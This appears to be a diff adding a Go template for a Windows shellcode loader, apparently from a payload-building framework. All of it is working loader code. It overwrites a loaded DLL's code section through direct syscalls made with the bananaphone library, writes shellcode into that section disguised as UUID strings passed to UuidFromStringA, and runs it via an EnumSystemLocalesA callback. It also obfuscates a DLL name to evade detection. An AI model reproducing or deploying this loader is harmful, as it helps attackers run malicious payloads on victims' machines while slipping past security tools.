@@ -1,0 +1,160 @@
+func run(shellcode []byte) {
+
+	const (
+		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
+		memCommit  = uintptr(0x00001000)
+		memreserve = uintptr(0x00002000)
+	)
+    
+   {{if .Debug}}
+   printDebug("info","Loading {{ .Library }}")
+   {{end}}
+   
+   	library := "{{ .Library }}"
+   	t, errDll := windows.LoadDLL(library)
+    if errDll != nil {
+		{{if .Debug}}
+		printDebug("error","Error while loading dll {{ .Library }} %s", errDll)
+		{{end}}
+		return
+    }
+
+	h := t.Handle
+	dllBase := uintptr(h)
+	dllOffset := uint(dllBase) + uint(0x1000)
+	{{if .Debug}}
+	printDebug("debug","DLL offset 0x%016x", dllOffset)
+	{{end}}
+	{{if .Debug}}
+	printDebug("info","Loading bananaphone")
+	{{end}}
+	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	if e != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling NewBananaPhone:\n%s", e)
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Will change memory protection to PAGE_READWRITE")
+	{{end}}
+	protect, e := bp.GetSysID("NtProtectVirtualMemory")
+	if e != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling GetSysID:\n%s", e)
+		{{end}}
+		return
+	}
+
+	var r1 uint32
+	var r error
+	
+	{{ if not .Debug }}
+	_ = r
+	_ = r1
+	{{end}}
+	regionsize := uintptr(len(shellcode))
+	var oldprotect uintptr
+	r1, r = bananaphone.Syscall(
+		protect, //NtProtectVirtualMemory
+		thisThread,
+		uintptr(unsafe.Pointer(&dllOffset)),
+		uintptr(unsafe.Pointer(&regionsize)),
+		syscall.PAGE_READWRITE,
+		uintptr(unsafe.Pointer(&oldprotect)),
+	)
+	if r != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling NtProtectVirtualMemory: %s %x", r, r1)
+		{{end}}
+		return
+	}
+	{{if .Debug}}
+	printDebug("info","Decode UUID bytes to string")
+	{{end}}
+
+	if (len(shellcode) % 16) != 0 {
+		{{if .Debug}}
+		printDebug("info","len shellcode %d is not a multiple of 16", len(shellcode))
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Load  kernel32.dll and rcpcrt4.dll")
+	{{end}}
+	kernel32 := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
+	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")
+	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
+	uuidFromString := rpcrt4.NewProc("UuidFromStringA")
+	{{if .Debug}}
+	printDebug("info","Copy shellcode in memory")
+	{{end}}
+	addrPtr := uintptr(dllOffset)
+	//for _, uuid := range uuids {
+	for i := 0; i < len(shellcode); i = i + 16 {
+
+		// Must be a RPC_CSTR which is null terminated
+		if i + 16 > len(shellcode) {
+			break
+		}
+		
+		buf := make([]byte, 36)
+		u:= shellcode[i:i+16]
+		hex.Encode(buf[0:8], u[0:4])
+		buf[8] = '-'
+		hex.Encode(buf[9:13], u[4:6])
+		buf[13] = '-'
+		hex.Encode(buf[14:18], u[6:8])
+		buf[18] = '-'
+		hex.Encode(buf[19:23], u[8:10])
+		buf[23] = '-'
+		hex.Encode(buf[24:], u[10:])
+
+		f := append([]byte(buf), 0)
+
+		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
+		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&f[0])), addrPtr)
+
+		// RPC_S_OK = 0
+		if rpcStatus != 0 {
+			{{if .Debug}}
+			printDebug("error", "There was an error calling UuidFromStringA:\r\n%s", err.Error())
+			{{end}}
+		}
+
+		addrPtr += 16
+	}
+	{{if .Debug}}
+	printDebug("info","Restore the memory protections")
+	{{end}}
+	r1, r = bananaphone.Syscall(
+		protect, //NtProtectVirtualMemory
+		thisThread,
+		uintptr(unsafe.Pointer(&dllOffset)),
+		uintptr(unsafe.Pointer(&regionsize)),
+		syscall.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldprotect)),
+	)
+	if r != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling NtProtectVirtualMemory: %s %x", r, r1)
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Try to execute shellcode")
+	{{end}}
+	ret, _, err := enumSystemLocalesA.Call(uintptr(dllOffset), 0)
+	if ret == 0 {
+		{{if .Debug}}
+		printDebug("error", "EnumSystemLocalesA GetLastError: %s", err.Error())
+		{{end}}
+		return
+	}
+	{{if .Debug}}
+	printDebug("info","Shellcode Executed")
+	{{end}}
+}
